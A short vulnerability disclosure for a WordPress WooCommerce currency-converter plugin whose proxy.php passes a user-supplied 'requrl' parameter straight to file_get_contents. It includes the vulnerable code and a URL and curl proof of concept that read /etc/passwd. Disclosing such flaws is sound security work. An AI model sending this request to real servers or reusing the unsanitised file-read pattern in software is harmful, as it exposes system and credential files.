 Description:
 proxy.php's code:
 <?php
$file = file_get_contents($_GET['requrl']);
$left=strpos($file,'<div id=currency_converter_result>');
$right=strlen($file)-strpos($file,'<input type=hidden name=meta');
$snip= substr($file,$left,$right);
echo $snip;
?>
Based on user input, the content of a file is printed out (unfortunately
not included) so any html file can be loaded, and an attacker may be able
to read  any local file which
is not executed in the server.
Example:
http://localhost/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=/etc/passwd
POC:
curl --silent --url
http://localhost/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=/etc/passwd
